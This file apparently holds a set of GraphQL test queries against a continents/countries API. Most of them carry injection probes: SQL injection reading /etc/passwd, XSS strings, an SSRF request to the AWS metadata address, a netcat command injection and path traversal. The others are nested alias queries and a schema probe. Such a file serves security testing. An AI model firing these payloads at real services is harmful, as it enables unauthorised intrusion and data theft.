query.query:
query {
  continents(filter: { code: { eq: "1' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--" } }) {
    code
    name
  }
}

query {
  continents(filter: { name: { contains: "<script>alert(document.domain)</script>" } }) {
    code
    name
  }
}

query {
  continents(filter: { name: { contains: "http://169.254.169.254/latest/meta-data" } }) {
    code
    countries {
      awsRegion
    }
  }
}

query {
  continents(filter: { code: { eq: "$(nc 127.0.0.1 1337)" } }) {
    code
    name
  }
}

query {
  continents(filter: { name: { contains: "../../../../etc/passwd" } }) {
    code
    countries {
      capital
    }
  }
}

query {
  continents(filter: { name: { contains: "<iframe src='javascript:alert(1)'>" } }) {
    code
    name
  }
}

query {
  continents {
    code
    countries {
      languages {
        code
        native
      }
    }
  }
}

query {
  a1: continents { code }
  a2: continents {
    countries {
      a3: languages {
        a4: native
      }
    }
  }
}

query {
  continents {
    queryType {
      name
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
